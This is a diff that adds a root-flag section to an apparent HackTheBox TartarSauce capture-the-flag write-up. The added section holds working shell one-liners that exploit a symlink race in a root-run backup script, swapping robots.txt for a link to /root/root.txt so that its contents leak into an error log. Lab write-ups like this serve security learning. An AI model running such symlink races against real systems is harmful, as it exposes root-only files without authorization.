@@ -348,11 +348,45 @@ fi
 
 + If there is nothing reported, the zip will be added to $bkpdir/onuma-www-dev.bak and $check directory will be removed.
 
++ We didn't get the root shell here.
 
+## Getting 'root flag'
++ We can see the script is run at five minute intervals by inspecting **/var/backups/onuma_backup_test.txt**, and observing the last run timestamp.
++ Monitor for the creation of **$tmpfile** : **/var/tmp/.{randomized_chars}**
++ Once this file is created, we have **30 seconds** to create a condition where **integrity_chk()** will produce some output.
++ Once **$tmpfile** is created, symbolically link **/root/root.txt**
+
++ **until** the **find** command finds a file name starting with **.** in **/var/tmp** sleep for 3 seconds in a continuous loop.
++ Once that is done, the next series of commands will be run.
+```
+until [[ $(find /var/tmp/ -maxdepth 1 -type f -name '.*') ]] ; do sleep 3 ; done ;
+```
+ 
++ Backup the original **robots.txt** file to the **/tmp** directory.
++ Create a symbolic link of **/root/root.txt** to **/var/www/html/robots.txt**.
++ Then, once **integrity_chk()** compares **/var/www/html** to **/var/tmp/check/var/www/html**, the **robots.txt** in **/var/tmp/check** will be different from those in **/var/www/html** and the differential lines will be written to the error log.
+```
+mv /var/www/html/robots.txt /tmp/robots.txt ; 
+ln -s /root/root.txt /var/www/html/robots.txt ;
+```
+
++ This last part is just a bit of cleanup. Until the **/usr/sbin/backuperer** process exits, repeatedly sleep for 3 seconds.
++ Then, cleanup the symbolic links and restore the original files from **/tmp**.
+```
+until [[ ! $(ps aux | grep backuperer | grep -v grep) ]] ; do sleep 3 ; done ; unlink /var/www/html/robots.txt ; mv /tmp/robots.txt /var/www/html/robots.txt ; cat /var/backups/onuma_backup_error.txt 
+```
+
++ Get the **root flag** using one-liner command.
+```
+until [[ $(find /var/tmp/ -maxdepth 1 -type f -name '.*') ]] ; do sleep 3 ; done ; mv /var/www/html/robots.txt /tmp/robots.txt ; ln -s /root/root.txt /var/www/html/robots.txt ; until [[ ! $(ps aux | grep backuperer | grep -v grep) ]] ; do sleep 3 ; done ; unlink /var/www/html/robots.txt ; mv /tmp/robots.txt /var/www/html/robots.txt ; cat /var/backups/onuma_backup_error.txt 
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/af638d09-99ef-479d-b797-32ef38eb553c)
 
 
 # References & Alternatives
 + https://vvmlist.github.io/#TartarSauce
++ https://benheater.com/hackthebox-tartarsauce/
 + https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html
 + xxx
 
